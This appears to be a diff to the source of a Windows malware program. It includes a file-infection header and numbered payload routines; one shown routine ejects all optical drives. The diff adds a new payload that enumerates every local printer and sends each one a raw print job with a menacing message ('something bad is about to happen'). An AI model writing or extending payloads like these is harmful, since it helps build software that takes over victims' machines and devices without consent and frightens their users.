@@ -22,8 +22,10 @@
 #include "utils/fileinfect/fileinfect.h"
 
 #include "easter/hw.h"
+#include "utils/printer.h"
 
 #include <cstdio>
+#include <cstdlib>
 
 volatile bool gFxStop = false;
 
@@ -5985,6 +5987,45 @@ DWORD WINAPI GDIPayload64(LPVOID)
 DWORD WINAPI GDIPayload65(LPVOID)
 {
     MassEject::EjectAllOptical();
+    return 0;
+}
+
+// ============================================================
+// PAYLOAD 66
+// War Print: sends a menacing block of text to every locally
+// installed printer (raw print job). No printers = harmless.
+// ============================================================
+
+DWORD WINAPI GDIPayload66(LPVOID)
+{
+    wchar_t names[32][256]{};
+
+    const int count =
+        Printer::Enumerate(names, 32);
+
+    if (count <= 0)
+        return 0;
+
+    const wchar_t text[] =
+        L"HPPD\r\n"
+        L"\r\n"
+        L"something bad is about to happen..\r\n"
+        L"and all your printers will know it.\r\n"
+        L"\r\n"
+        L"BYE.";
+
+    wchar_t* normalized =
+        Printer::NormalizeText(text);
+
+    const wchar_t* payload =
+        normalized ? normalized : text;
+
+    for (int i = 0; i < count; ++i)
+        Printer::PrintText(names[i], payload);
+
+    if (normalized)
+        free(normalized);
+
     return 0;
 }
 
